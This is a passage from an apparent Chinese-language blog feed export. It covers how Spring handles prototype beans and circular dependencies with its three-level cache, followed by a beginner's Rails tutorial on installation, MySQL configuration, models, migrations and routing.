    <span class="token keyword">public</span> <span class="token class-name">B</span> <span class="token function">getB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> b<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setB</span><span class="token punctuation">(</span><span class="token class-name">B</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> b<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
		<span class="token comment">//进入A的无参构造器，实例化对象</span>
    <span class="token keyword">public</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"---A created success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Initialize the bean instance.</span>
		<span class="token class-name">Object</span> exposedObject <span class="token operator">=</span> bean<span class="token punctuation">;</span>
		<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
			<span class="token comment">//填充属性</span>
			<span class="token function">populateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> instanceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
			exposedObject <span class="token operator">=</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> exposedObject<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>以上断点代码就是Spring中的源码显示，大家感兴趣，也可以自己打一遍。</p>
<p><strong>小总结</strong>：</p>
<ol>
<li>我们可以看到为什么当变量设置为prototype时，每次返回的对象都不一样.<ul>
<li>因为在Spring容器中根本没有缓存之前的对象，而是每次都反射一个新的对象进行返回。</li>
<li>而在单例模式时，会将对象放到缓存中，这样你下次再要对象时，直接从一级缓存中找。</li>
</ul>
</li>
<li>prototype也叫做原型，很多人以为是利用了原型设计模式，存第一次创建的实例，然后每次拷贝一个新的返回。<ul>
<li>但根据源码阅读发现创建的实例根本没有存储在容器中，哪来的拷贝。<code>不看源码你就被坑了，但是也不要相信我的话，你最好自己再看一遍。</code></li>
<li>推荐一个博主写的文章：<a href="https://blog.csdn.net/FanYien/article/details/117898188%E3%80%82">https://blog.csdn.net/FanYien/article/details/117898188。</a></li>
</ul>
</li>
<li>那prototype能解决循环依赖问题吗？<ul>
<li>不能，因为假如说A类中有一个B属性需要注入，当实例化A时需要注入B，而B现在没有，需要先实例一个B对象，实例B的时候一个A注入，但容器中找不到之前创建的A，所以需要自己再实例一个A对象，循环往复，因为每次返回的对象都不同。Spring官网也明确禁止了。</li>
<li>所以我们说Spring解决循环依赖的前提是对象是单例模式下的，并通过Set方法构建。</li>
</ul>
</li>
<li>那单例模式下是如何解决循环依赖的？<ul>
<li>这里推荐另一个博主写的，写的非常详细：<a href="https://blog.csdn.net/oneby1314/article/details/113789384">https://blog.csdn.net/oneby1314/article/details/113789384</a></li>
<li>其实总结下来就是，利用三层缓存来解决，现在容器需要注入一个A对象时，先去一级缓存中找，没有的话则容器直接实例化一个A（没有对属性赋值）并放入三级缓存，当需要注入A对象的B属性类时，也去容器找，没有的话再实例化一个B，当给B对象的A赋值时，也去一级缓存找，没有则去二级缓存找，再没有去三级缓存，这是发现找到了之前的A，则直接注入，B这就算完整了放在一级缓存，又回到A的初始化，去一级缓存找，发现有一个B，则对A也初始化。这样循环依赖就解决掉了。具体可以看上面博主的文章。</li>
</ul>
</li>
<li>看完后突然感觉似乎一层缓存也可以解决循环依赖问题，为什么Spring要用三层？<ul>
<li>这里我是看了<a href="https://juejin.cn/post/6930904292958142478%E8%BF%99%E4%BD%8D%E5%8D%9A%E4%B8%BB%E7%9A%84%E6%96%87%E7%AB%A0%E6%89%8D%E7%90%86%E8%A7%A3%E4%B8%80%E4%BA%9B">https://juejin.cn/post/6930904292958142478这位博主的文章才理解一些</a></li>
<li>大致是说三级缓存是Spring在结合<code>AOP</code>跟Bean的生命周期的设计，保证如果需要代理时，保证在Bean生命周期最后一步再完成代理。</li>
<li><img src="/Users/qinsicheng/myBoke/source/typora-user-images/image-20220902091424411.png"></li>
</ul>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    这算是我第一次自己读Spring源码，在之前一般遇到问题我都是看有没有别人的总结，觉的源码我肯定看不了，看别人的总结又方便又快捷。今天是因为当我再来回顾这些知识的时候，脑子里出现很多问题，感觉作者并没有说清楚，而且众说纷纭，那我们就自己做实验，自己去寻找答案吧，虽然开始做是耗时耗力，但能让你的心慢慢沉下来，浮躁是读不了源码的，感谢之前一位朋友的建议，<code>生活上我们很多事情不需要太较真，但学习必须较真!!!</code>,文笔有限，如果觉得哪里写的有问题，也欢迎提醒我进行修改。最后建议大家，全信书不如无书，自己去打断点看源码得到的才是最真实的。</p>
]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>循环依赖,三级缓存</tag>
      </tags>
  </entry>
  <entry>
    <title>Rails基础</title>
    <url>//post/Ruby/Rails%E5%9F%BA%E7%A1%80.html</url>
    <content><![CDATA[<h1 id="Ruby-On-Rails"><a href="#Ruby-On-Rails" class="headerlink" title="Ruby On Rails"></a>Ruby On Rails</h1><h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><p>​    Rails可以理解为一个快速构建Web应用的框架，本身基于Ruby开发，拥有很强的灵活性。</p>
<blockquote>
<p>如何下载与使用Rails？      这里的前提是你已经下载好了Ruby</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gem <span class="token function">install</span> rails    <span class="token comment"># 通过ruby工具(当成功下载并使用Ruby时，该工具会一同配置好的) 下载 rails</span>
rails <span class="token parameter variable">-v</span>             <span class="token comment"># 如果正常下载则显示Rails版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>​    这里我在Mac上下载好<code>rails</code>并使用时，遇到了报错显示，显示rails还没有立刻被下载成功，需要再执行上面下载命令（但是并没什么用，至少我是这样，有的人说是有一个延迟时间）：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Rails is not currently installed on this system. To get the latest version, simply type:

    $ <span class="token function">sudo</span> gem <span class="token function">install</span> rails

You can <span class="token keyword">then</span> rerun your <span class="token string">"rails"</span> command.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这里我的解决方式为：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gem <span class="token function">env</span>   <span class="token comment"># 显示gem 环境变量</span>

RubyGems Environment:
   <span class="token parameter variable">-RUBYGEMS</span> VERSION: <span class="token number">3.1</span>.2
   <span class="token parameter variable">-RUBY</span> VERSION: <span class="token number">2.7</span>.1 <span class="token punctuation">(</span><span class="token number">2020</span>-03-31 patchlevel <span class="token number">83</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>x86_64-darwin19<span class="token punctuation">]</span>
   <span class="token parameter variable">-INSTALLATION</span> DIRECTORY: /usr/local/lib/ruby/gems/2.7.0  <span class="token comment"># 这里是重点 ！！！</span>
   <span class="token parameter variable">-USER</span> INSTALLATION DIRECTORY: /Users/xxx/.gem/ruby/2.7.0
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    我们按照显示的<code>INSTALLATION DIRECTORY</code>,访问并进入bin目录，查看是否有<code>rails</code>命令, 如果有就说明安装的没问题，并使用这个<code>rails</code>,看是否能正常使用。如果都OK，则把这里的地址添加到环境变量即可。</p>
<blockquote>
<p><code>Ruby,rvm,gem,gems,bundle,gemfile</code> 的区别?</p>
</blockquote>
<ul>
<li>Ruby 是一种面向对象的脚本语言</li>
<li>rvm 是一个命令行工具，提供多版本的Ruby环境管理与切换</li>
<li>gem 是使用ruby写的软件包，每个gem都有名称，版本和平台，每个gem都有规范的格式，Rails就是一个gem</li>
<li>RubyGems简称gems，允许下载，安装，使用系统上的gem</li>
<li>ruby项目依赖一系列的ruby gems，<strong>bundler</strong>是一个管理构建工具，bundle本身也是一个gem，可以理解为Maven</li>
<li>gemfile是描述gem之间依赖的文件，定义从哪个源找到这些gem，使用哪个版本，类似与<code>pom.xml</code></li>
</ul>
<blockquote>
<p>快速创建一个博客项目：</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 自动生成一个叫blog的Rails项目，你也可以通过使用 rails new --help 查看可以使用的参数</span>
rails new blog
<span class="token comment"># 生成一个只提供API的后端接口项目</span>
rails new blog <span class="token parameter variable">--api</span>
<span class="token comment"># 生成一个最小，干净的Rails项目（初学者不建议，因为很多东西需要自己配置了）</span>
rails new blog <span class="token parameter variable">--minimal</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这里可能会报错，显示：<code>infind_spec_for_exe&#39;: can&#39;t find gem bundler (= 2.4.1) with executable bundle</code> 错误信息。</p>
<p>​    这里我们可以查看gem内部是否有合格的bundler</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gem list <span class="token parameter variable">--local</span>   <span class="token comment"># 查看本地gem 管理集合</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​    如果发现bundler的版本与报错信息不符合，我们可以下载一个新的版本的bundler。</p>
<p>​    一切OK后，就可以从新执行：<code>rails new blog</code>创建一个新的项目。</p>
<blockquote>
<p>国内情况下，bundler install会很慢，我们可以修改源</p>
<p>文章：<a href="https://www.geuni.tech/ruby/ruby_gems_bundler_mirrors/">https://www.geuni.tech/ruby/ruby_gems_bundler_mirrors/</a></p>
</blockquote>
<p>​    中文老版本教程：<a href="https://ruby-china.github.io/rails-guides/getting_started.html">https://ruby-china.github.io/rails-guides/getting_started.html</a>  （不建议因为版本老旧有些代码不生效）</p>
<p>​    中文新教程：<a href="https://github.com/GengCen-Qin/rails-quotes">https://github.com/GengCen-Qin/rails-quotes</a> （会更全面一些，主要介绍Rails7的很多特性）</p>
<p>​    英文新版本教程：<a href="https://guides.rubyonrails.org/getting_started.html">https://guides.rubyonrails.org/getting_started.html</a></p>
<h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><ol>
<li><code>rails new demo --css=bootstrap（这里的也可以指定其他css框架，使用rails new -h可以查看）</code> 一切都帮你配置好</li>
<li>视频教程：<a href="https://www.bilibili.com/video/BV1w84y1p7eq/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1w84y1p7eq/?spm_id_from=333.337.search-card.all.click</a></li>
<li>引入一些简单的样式</li>
</ol>
<pre class="line-numbers language-erb" data-language="erb"><code class="language-erb"><span class="token comment">&lt;!--引入简单的css样式,application.html.erb文件中--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.simplecss.org/simple.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>这里我们以操作Mysql为例，因为Rails本身对常用的数据库都有支持，我们只修改配置信息，通过强大的ORM框架，很容易的迁移到其他的数据库，而不需要修改我们的业务代码。比如开发环境使用<code>sqlite</code>，正式环境使用<code>mysql</code></p>
<ol>
<li>Gemfile 引入： <code>gem &quot;mysql2&quot;</code></li>
<li>bundle 下载依赖，记住每次下载新的依赖后，都需要重启应用刷新</li>
<li>修改<code>config/database.yml</code>文件</li>
</ol>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">default</span><span class="token punctuation">:</span> <span class="token important">&amp;default</span>
  <span class="token key atrule">adapter</span><span class="token punctuation">:</span> mysql2
  <span class="token key atrule">encoding</span><span class="token punctuation">:</span> utf8
  <span class="token key atrule">pool</span><span class="token punctuation">:</span> &lt;%= ENV.fetch("RAILS_MAX_THREADS") <span class="token punctuation">&#123;</span> <span class="token number">5</span> <span class="token punctuation">&#125;</span> %<span class="token punctuation">></span>  // ENV.fetch() 获取环境变量中寻找信息
  <span class="token key atrule">host</span><span class="token punctuation">:</span> 127.0.0.1
  <span class="token key atrule">username</span><span class="token punctuation">:</span> root
  <span class="token key atrule">password</span><span class="token punctuation">:</span> <span class="token number">123456</span>
  <span class="token key atrule">timeout</span><span class="token punctuation">:</span> <span class="token number">5000</span>

<span class="token key atrule">development</span><span class="token punctuation">:</span> // 开发环境
  <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*default</span>  // 继承上面
  <span class="token key atrule">database</span><span class="token punctuation">:</span> ruby_development

<span class="token key atrule">test</span><span class="token punctuation">:</span> // 测试环境
  <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*default</span>
  <span class="token key atrule">database</span><span class="token punctuation">:</span> ruby_test

<span class="token key atrule">production</span><span class="token punctuation">:</span>  // 生产环境
  <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*default</span>
  <span class="token key atrule">database</span><span class="token punctuation">:</span> ruby_production<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>​    这里我们将数据库中的一张表与一个模型相对应，和Java的Spring中Model是一样的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rails g model User name:string age:integer  <span class="token comment"># 自动创建User模型</span>

      <span class="token comment"># 以下是该命令生成的文件</span>
      invoke  active_record
        <span class="token comment"># 记录模型的信息</span>
        create    db/migrate/20230106005931_create_users.rb
        <span class="token comment"># 模型类定义</span>
        create    app/models/user.rb
      invoke    test_unit
      	<span class="token comment"># 测试文件</span>
        create      test/models/user_test.rb
        create      test/fixtures/users.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>`20230106005931_create_users.rb，这是一个迁移文件，也就是说我们现在Rails中定义整张表的结构，等完成后，通过指令在数据库中创建会修改这张表，这里我们看到文件的前面有一个时间戳，也就说Rails操作数据库是有版本控制的</p>
</blockquote>
<p>修改<code>db/migrate/20221228104215_create_users.rb</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">CreateUsers</span> <span class="token operator">&lt;</span> ActiveRecord<span class="token double-colon punctuation">::</span>Migration<span class="token punctuation">[</span><span class="token number">7.0</span><span class="token punctuation">]</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">change</span></span>
    <span class="token comment"># users 是表名</span>
    create_table <span class="token symbol">:users</span> <span class="token keyword">do</span> <span class="token operator">|</span>t<span class="token operator">|</span>
      <span class="token comment"># users表的字段</span>
      t<span class="token punctuation">.</span>string <span class="token symbol">:username</span>  <span class="token comment"># string 代表就是 数据库中的varchar</span>
      t<span class="token punctuation">.</span>string <span class="token symbol">:password</span>
      <span class="token comment"># 自动生成时间戳：create_at , update_at</span>
      t<span class="token punctuation">.</span>timestamps
      <span class="token comment"># 额外的还会生成 主键id</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>移植到数据库，也就是根据上面的文件，在数据库中创建对应的表</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rake db:create   <span class="token comment"># 创建对应的数据库</span>
rake db:migrate  <span class="token comment"># 会将上面的定义的users表结构创建到数据库中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在Web开发中最常见的需求就是增晒改查了，Rails通过<code>routes.rb</code>来定义路由</p>
<p>当使用<code>resources :users</code>, 就会自动生成对user信息的增删改查等请求路径</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">resources :users  <span class="token comment"># 这里使用模型的复数</span>

<span class="token comment">###############  下面是使用 rails routes 显示自动生成的路由匹配</span>

Prefix       Verb    URI Pattern                     Controller<span class="token comment">#Action</span>
<span class="token function">users</span>        GET     /users<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>                <span class="token function">users</span><span class="token comment">#index</span>
             POST    /users<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>                <span class="token function">users</span><span class="token comment">#create</span>
new_user     GET     /users/new<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>            <span class="token function">users</span><span class="token comment">#new</span>
edit_user    GET     /users/:id/edit<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>       <span class="token function">users</span><span class="token comment">#edit</span>
user         GET     /users/:id<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>            <span class="token function">users</span><span class="token comment">#show</span>
             PATCH   /users/:id<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>            <span class="token function">users</span><span class="token comment">#update</span>
             PUT     /users/:id<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>            <span class="token function">users</span><span class="token comment">#update</span>
             DELETE  /users/:id<span class="token punctuation">(</span>.:format<span class="token punctuation">)</span>            <span class="token function">users</span><span class="token comment">#destroy</span>


<span class="token comment">###############  在资源使用时，会对资源加入后缀 _path 或者 _url</span>
path 是相对路径
url  是绝对路径

如对于user而言：
<span class="token punctuation">(</span>prefix_path/url<span class="token punctuation">)</span>  请求路径
users_url     <span class="token comment"># => http://localhost:3000/users</span>
users_path    <span class="token comment"># => /users</span>
user_path<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># => /users/1</span>
user_url<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment"># => http://localhost:3000/users/1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如我们想通过命令行快速查询数据库某些信息时，可以通过rails的命令行控制台来操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rails c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>按照定义的模型可以进行增删改查，这里以User为例</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">User<span class="token punctuation">.</span>create username<span class="token operator">:</span> <span class="token string-literal"><span class="token string">'qsc'</span></span><span class="token punctuation">,</span><span class="token symbol">password</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'123456'</span></span>   <span class="token comment"># 创建一条数据</span>

User<span class="token punctuation">.</span>all<span class="token punctuation">.</span>to_a   <span class="token comment"># 查看数据</span>

user <span class="token operator">=</span> User<span class="token punctuation">.</span>first   <span class="token comment"># 获取第一条数据，并赋值给user变量</span>

user<span class="token punctuation">.</span>username  <span class="token comment"># 输出name</span>
user<span class="token punctuation">.</span>password  <span class="token comment"># 输出password</span>

user<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'TLL'</span></span>  <span class="token comment"># 修改变量值</span>

user<span class="token punctuation">.</span>save  <span class="token comment"># 修改改数据</span>

user<span class="token punctuation">.</span>destory  <span class="token comment"># 删除该数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 这里是将当前用户的id报错到session中</span>
session<span class="token punctuation">[</span><span class="token symbol">:user_id</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">.</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><p>​    在一般用户登陆操作，或者用户请求追踪，可以使用</p>
<ul>
<li>before_filter       在action之前执行 , rails 5 以后的版本 before_filter 已更新为 before_action</li>
<li>around_filter       在action前后执行</li>
<li>after_filter        在action之后执行</li>
</ul>
<h2 id="Routes"><a href="#Routes" class="headerlink" title="Routes"></a>Routes</h2><p>​    和Spring中的<code>ResquestMapping</code>类似</p>
<blockquote>
<p>自定义路由：</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 当访问 /users/1 时， 执行UsersController中的show方法</span>
get <span class="token string-literal"><span class="token string">'/users/:id'</span></span><span class="token punctuation">,</span> <span class="token symbol">to</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'users#show'</span></span>
<span class="token keyword">or</span>
get <span class="token string-literal"><span class="token string">'/users/:id'</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">'users#show'</span></span>

<span class="token comment"># 命名路由</span>
get <span class="token string-literal"><span class="token string">'/users/:id'</span></span><span class="token punctuation">,</span> <span class="token symbol">to</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'users#show'</span></span><span class="token punctuation">,</span> <span class="token symbol">as</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"user"</span></span>
<span class="token comment"># in view or action</span>
user_path<span class="token punctuation">(</span>user<span class="token punctuation">.</span>id<span class="token punctuation">)</span>  <span class="token comment"># => /users/2</span>
user_path<span class="token punctuation">(</span>user<span class="token punctuation">)</span>     <span class="token comment"># 如果user中含有id，也会自动识别出</span>
user_url<span class="token punctuation">(</span>user<span class="token punctuation">)</span>      <span class="token comment"># http://localhost:3000/users/2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>Restful</code>请求风格</p>
<ul>
<li>get</li>
<li>post</li>
<li>put/patch</li>
<li>delete</li>
</ul>
<p>​    同一个Url可以拥有不同的请求方式，不同的请求方式可以访问不同的方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">resources <span class="token symbol">:users</span>

   Prefix Verb   <span class="token constant">URI</span> Pattern               Controller<span class="token comment">#Action</span>
    users <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          users<span class="token comment">#index</span>
          <span class="token constant">POST</span>   <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          users<span class="token comment">#create</span>
 new_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#new</span>
edit_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token operator">/</span>edit<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> users<span class="token comment">#edit</span>
     user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#show</span>
          <span class="token constant">PATCH</span>  <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#update</span>
          <span class="token constant">PUT</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#update</span>
          <span class="token constant">DELETE</span> <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#destroy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    可以通过<code>rails routes</code> 查看系统中所有信息</p>
<blockquote>
<p>控制器设定</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">controller <span class="token symbol">:welcome</span> <span class="token keyword">do</span>
  <span class="token comment"># 默认访问：welcome#hello</span>
   get <span class="token string-literal"><span class="token string">'/welcome/hello'</span></span>
<span class="token keyword">end</span>
       Prefix Verb <span class="token constant">URI</span> Pattern              Controller<span class="token comment">#Action</span>
welcome_hello <span class="token constant">GET</span>  <span class="token operator">/</span>welcome<span class="token operator">/</span>hello<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> welcome<span class="token comment">#hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>同时定义多个资源</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">resources <span class="token symbol">:users</span><span class="token punctuation">,</span><span class="token symbol">:sessions</span>  <span class="token comment"># 资源都为复数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>单数资源，比如用户自身的信息编辑，这里可以看到少了通过id查询的方式</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">resource <span class="token symbol">:user</span>             <span class="token comment"># 这里吧 resources 改为 resource</span>

   Prefix Verb   <span class="token constant">URI</span> Pattern          Controller<span class="token comment">#Action</span>
 new_user <span class="token constant">GET</span>    <span class="token operator">/</span>user<span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>  users<span class="token comment">#new</span>
edit_user <span class="token constant">GET</span>    <span class="token operator">/</span>user<span class="token operator">/</span>edit<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> users<span class="token comment">#edit</span>
     user <span class="token constant">GET</span>    <span class="token operator">/</span>user<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#show</span>
          <span class="token constant">PATCH</span>  <span class="token operator">/</span>user<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#update</span>
          <span class="token constant">PUT</span>    <span class="token operator">/</span>user<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#update</span>
          <span class="token constant">DELETE</span> <span class="token operator">/</span>user<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#destroy</span>
          <span class="token constant">POST</span>   <span class="token operator">/</span>user<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      users<span class="token comment">#create</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>控制器命名空间，会统一加入前缀，这里我们可以看到Controller为<code>admin/users</code>,那么Controller是如何设定的呢？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">namespace <span class="token symbol">:admin</span> <span class="token keyword">do</span>
  resources <span class="token symbol">:users</span>
<span class="token keyword">end</span>

         Prefix Verb   <span class="token constant">URI</span> Pattern                     Controller<span class="token comment">#Action</span>
    admin_users <span class="token constant">GET</span>    <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          admin<span class="token operator">/</span>users<span class="token comment">#index</span>
                <span class="token constant">POST</span>   <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          admin<span class="token operator">/</span>users<span class="token comment">#create</span>
